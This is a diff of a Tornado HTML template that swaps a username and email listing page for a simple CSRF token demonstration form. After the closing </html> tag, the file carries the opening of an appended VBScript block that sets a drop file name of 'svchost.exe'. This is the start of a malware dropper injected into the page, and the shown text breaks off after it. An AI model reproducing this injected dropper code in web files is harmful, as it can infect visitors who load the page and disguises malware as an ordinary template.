@@ -2,51 +2,18 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>index</title>
-    <style>
-        .pager a{
-            display: inline-block;
-            padding:5px;
-            margin: 3px;
-            background-color: cadetblue;
-        }
-        .pager a.active{
-            background-color: brown;
-            color: white;
-        }
-    </style>
-    <link rel="stylesheet" href="{{ static_url("common.css") }}">
-    <script src="static_url {{ jquery-1.12.4.min.js }}"></script>
+    <title>csrt</title>
 </head>
 <body>
-<h1>添加数据</h1>
-<form action="/index/{{ current_page }}" method="post">
-    <input type="text" name="username">
-    <input type="email" name="email">
-    <input type="submit" typeof="提交">
+
+<form action="/csrf" method="post">
+{#    {{ xsrf_form_html }}<br>#}
+    {% raw xsrf_form_html() %} <br>
+    <input type="text" placeholder="username"><br>
+    <input type="text" placeholder="password"><br>
+    <input type="submit">
 </form>
-<h1>显示数据</h1>
-<table border="1">
-    <thead>
-        <tr>
-            <th>用户名</th>
-            <th>邮箱</th>
-        </tr>
-    </thead>
-    <tbody>
-        {% for line in list_info %}
-            <tr>
-                <td>{{ line['username'] }}</td>
-                <!--<td>{% raw line['username'] %}</td>-->
-                <td>{{ line['email'] }}</td>
-            </tr>
-        {% end %}
-    </tbody>
-</table>
-<div class = "pager">
-    <!--{{str_page}}-->
-    {% raw str_page %}
-</div>
+
 </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
